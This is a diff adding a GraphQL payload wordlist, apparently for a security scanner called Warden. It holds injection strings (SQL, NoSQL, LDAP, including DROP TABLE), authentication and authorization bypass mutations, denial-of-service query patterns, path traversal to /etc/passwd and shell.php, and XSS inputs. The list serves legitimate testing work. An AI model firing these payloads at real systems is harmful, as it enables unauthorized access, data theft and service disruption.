@@ -1,0 +1,284 @@
+# GraphQL payload wordlist
+# Embedded in Warden binary
+
+# === Introspection Queries ===
+
+# Basic introspection
+query { __schema { queryType { name } } }
+query { __schema { mutationType { name } } }
+query { __schema { subscriptionType { name } } }
+query { __type(name: "Query") { fields { name } } }
+query { __type(name: "User") { fields { name type { name } } } }
+
+# Full introspection (most dangerous)
+query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields { name type { name kind } } } directives { name description } } }
+
+# Type introspection
+query { __type(name: "Query") { fields { name description args { name type { name } } } } }
+query { __type(name: "Mutation") { fields { name description args { name type { name } } } } }
+query { __type(name: "Subscription") { fields { name description } } }
+
+# Enum values introspection
+query { __type(name: "Status") { enumValues { name description } } }
+
+# Interface introspection
+query { __type(name: "Node") { fields { name } interfaces { name } } }
+
+# Union types
+query { __type(name: "SearchResult") { possibleTypes { name } } }
+
+# === Authentication Bypass ===
+
+# Login mutation bypass
+mutation { login(input: { email: "admin@localhost", password: "'" }) { token } }
+mutation { login(input: { email: "' OR 1=1--", password: "anything" }) { token } }
+mutation { login(input: { email: "admin@localhost'--", password: "" }) { token } }
+
+# NoSQL injection in login
+mutation { login(input: { email: "{$ne:null}", password: "{$ne:null}" }) { token } }
+mutation { login(input: { email: "{\"$ne\":\"\"}", password: "{\"$ne\":\"\"}" }) { token } }
+
+# Boolean-based bypass
+mutation { login(input: { email: "\" OR \"1\"=\"1\"", password: "\" OR \"1\"=\"1\"" }) { token } }
+
+# === Injection Payloads ===
+
+# SQL Injection in arguments
+query { user(id: "1' OR '1'='1") { id email password } }
+query { user(id: "1' UNION SELECT NULL,NULL,NULL--") { id } }
+query { users(where: "id=1 OR 1=1--") { id email } }
+query { user(id: "1'; DROP TABLE users--") { id } }
+query { user(id: "1' AND SLEEP(5)--") { id } }
+
+# NoSQL Injection
+query { user(id: "{$ne:null}") { id email } }
+query { user(id: "{$gt:' '}") { id } }
+query { users(where: "{\"$or\":[{\"id\":\"1\"},{\"id\":\"2\"}]}") { id } }
+query { user(id: "'; return db.users.find(); //") { id } }
+
+# XPath Injection
+query { user(id: "' or '1'='1") { id } }
+query { user(id: "' or 1=1 or ''='") { id } }
+
+# LDAP Injection
+query { user(id: "*)(&") { id } }
+query { user(id: "*)(uid=*") { id } }
+
+# === Directive Abuse ===
+
+# Include directive to bypass checks
+query { user(id: "1") @include(if: true) { id passwordHash } }
+query { user(id: "1") @include(if: "true") { id email password } }
+
+# Skip directive
+query { user(id: "1") @skip(if: false) { password apiKey } }
+query { adminUsers @skip(if: false) { id email permissions } }
+
+# Deprecated directive
+query { deprecatedField @deprecated(reason: "test") { value } }
+
+# Custom directives (if available)
+query { users @auth(role: "admin") { id } }
+query { sensitiveData @cache(ttl: 0) { value } }
+
+# === DoS - Nested Queries ===
+
+# Deep nesting for DoS
+query { user(id: "1") { friends { friends { friends { friends { friends { id } } } } } } }
+query { user(id: "1") { posts { comments { author { posts { comments { id } } } } } } }
+query { user(id: "1") { friends { friends { friends { friends { friends { friends { friends { friends { id } } } } } } } } } }
+
+# Circular references
+query { user(id: "1") { friends { friends { friends { friends { friends { friends { friends { friends { friends { id } } } } } } } } } } }
+
+# === DoS - Alias Abuse ===
+
+# Multiple aliases for amplification
+query { u1:user(id:"1"){email} u2:user(id:"1"){email} u3:user(id:"1"){email} u4:user(id:"1"){email} u5:user(id:"1"){email} }
+query { u1:user(id:"1"){email} u2:user(id:"2"){email} u3:user(id:"3"){email} u4:user(id:"4"){email} u5:user(id:"5"){email} u6:user(id:"6"){email} u7:user(id:"7"){email} u8:user(id:"8"){email} u9:user(id:"9"){email} u10:user(id:"10"){email} }
+query { a:posts{edges{node{id}}} b:posts{edges{node{id}}} c:posts{edges{node{id}}} d:posts{edges{node{id}}} e:posts{edges{node{id}}} f:posts{edges{node{id}}} g:posts{edges{node{id}}} h:posts{edges{node{id}}} i:posts{edges{node{id}}} j:posts{edges{node{id}}} }
+
+# === DoS - Field Duplication ===
+
+# Repeated fields
+query { user(id: "1") { id id id id id id id id id id id id id id id id id id id id } }
+query { posts { id id id id id id id id id id id id id id id id id id id id id title title title title title } }
+
+# === DoS - Large Queries ===
+
+# Many fields selection
+query { users { id email name username firstName lastName bio avatar location website createdAt updatedAt } }
+query { posts { id title content author { id name username email } comments { id content author { id } } tags { id name } } }
+
+# === DoS - Complex Fragments ===
+
+# Fragment spread
+query { user(id: "1") { ...userFields } } fragment userFields on User { id email posts { ...postFields } } fragment postFields on Post { id title comments { ...commentFields } } fragment commentFields on Comment { id content }
+
+# Inline fragments
+query { node(id: "1") { ... on User { id email } ... on Post { id title } ... on Comment { id content } } }
+
+# === Batch Query Testing ===
+
+# Batch queries (JSON array)
+[{"query":"query { __typename }"},{"query":"query { __typename }"},{"query":"query { __typename }"},{"query":"query { __typename }"},{"query":"query { __typename }"}]
+[{"query":"query { users { id } }"},{"query":"mutation { createPost { id } }"},{"query":"query { posts { id } }"},{"query":"mutation { deletePost { id } }"},{"query":"query { users { id } }"}]
+
+# === CSRF via GET ===
+
+# GET request payloads
+?query={__typename}
+?query={users{id,email}}
+?query=query+{__schema{queryType{name}}}
+?query={user(id:"1"){password}}
+
+# === Information Disclosure ===
+
+# Field enumeration
+query { __schema { types { name } } }
+query { __type(name: "User") { fields { name type { name } } } }
+query { __type(name: "Mutation") { fields { name description } } }
+
+# Enum value discovery
+query { __type(name: "UserRole") { enumValues { name } } }
+query { __type(name: "Permission") { enumValues { name description } } }
+
+# === Batching and Rate Limit Bypass ===
+
+# Sequential mutations
+mutation { m1:createUser(input:{name:"a"}){id} m2:createUser(input:{name:"b"}){id} m3:createUser(input:{name:"c"}){id} }
+
+# Parallel queries
+query { q1:users{id} q2:posts{id} q3:comments{id} q4:products{id} q5:orders{id} }
+
+# === Authorization Bypass ===
+
+# Direct ID access
+query { user(id: "1") { id email password } }
+query { user(id: "admin") { id email apiKey permissions } }
+query { user(id: "0") { id email } }
+
+# ID enumeration
+query { user(id: "1") { id } }
+query { user(id: "2") { id } }
+query { user(id: "999") { id } }
+
+# === Logic Bypass ===
+
+# Negative ID
+query { user(id: "-1") { id email } }
+query { user(id: "0") { id email } }
+
+# Large ID
+query { user(id: "999999999") { id } }
+
+# String manipulation
+query { user(id: "1OR1=1") { id } }
+query { user(id: "1\tOR\t1=1") { id } }
+
+# === Null/Undefined Tests ===
+
+# Null injection
+query { user(id: null) { id } }
+query { users(where: null) { id } }
+mutation { updateUser(id: "1", input: { email: null }) { id } }
+
+# Empty values
+query { user(id: "") { id } }
+query { users(search: "   ") { id } }
+
+# === Special Characters ===
+
+# Unicode and special chars
+query { user(id: "ñ") { id } }
+query { user(id: "<script>alert(1)</script>") { id } }
+query { user(id: "'\";--") { id } }
+query { user(id: "\x00") { id } }
+
+# Path traversal in arguments
+query { file(path: "../../../etc/passwd") { content } }
+query { upload(name: "../../shell.php") { url } }
+
+# === GraphQL Specific Attacks ===
+
+# AST injection
+query { user(id: "query { users { id } }") { id } }
+
+# Comment injection
+query { user(id: "1")#comment { id } }
+query { user(id: "1")--comment { id } }
+
+# Subscription abuse
+subscription { userUpdates { id email password } }
+subscription { allEvents { id type data } }
+
+# === Error-Based Extraction ===
+
+# Trigger errors for information
+query { __type(name: "NonExistent") { fields { name } } }
+query { user(id: "'") { id } }
+query { user(id: "\"") { id } }
+query { user(id: "{{") { id } }
+
+# Type confusion
+query { __type(name: "Int") { fields { name } } }
+query { user(id: {}) { id } }
+query { user(id: []) { id } }
+
+# === Header Manipulation ===
+
+# (Note: These are sent as HTTP headers, not in the body)
+# POST with Content-Type: application/graphql
+# POST with Content-Type: application/x-www-form-urlencoded
+# GET with query parameter
+
+# === Apollo/Relay Specific ===
+
+# Relay connections
+query { users(first: 999999) { edges { node { id email } } } }
+query { users(after: "YXJyYXljb25uZWN0aW9uOjA=", first: 999) { edges { node { password } } } }
+
+# Apollo Federation
+query { _service { sdl } }
+query { _entities(representations: [{__typename:"User",id:"1"}]) { __typename ... on User { id } } }
+
+# === Hasura Specific ===
+
+# Hasura system tables
+query { hdb_views { name } }
+query { hdb_tables { name } }
+query { hdb_function { name } }
+
+# Hasura actions
+query { __action { name definition { handler } } }
+
+# === Graphile/Prior Specific ===
+
+# Pg internals
+query { pgTables { name } }
+query { pgFunctions { name } }
+
+# === WordPress GraphQL ===
+
+# WPGraphQL specific
+query { users { nodes { id email roles { name } } } }
+query { posts { nodes { id title content author { node { email } } } } }
+
+# === Shopifier/Shopify ===
+
+# Shopify Storefront API
+query { shop { name description } }
+query { products(first: 100) { edges { node { id title } } } }
+
+# === Common Patterns ===
+
+# User enumeration
+query { users(where: {email: "admin@localhost"}) { id } }
+query { users(where: {username: "admin"}) { id } }
+
+# Password reset
+mutation { forgotPassword(email: "admin@localhost") { success } }
+mutation { resetPassword(token: "bypass", input: {newPassword: "Password123!"}) { success } }
+
+# Email verification bypass
+mutation { verifyEmail(token: "bypass") { success } }
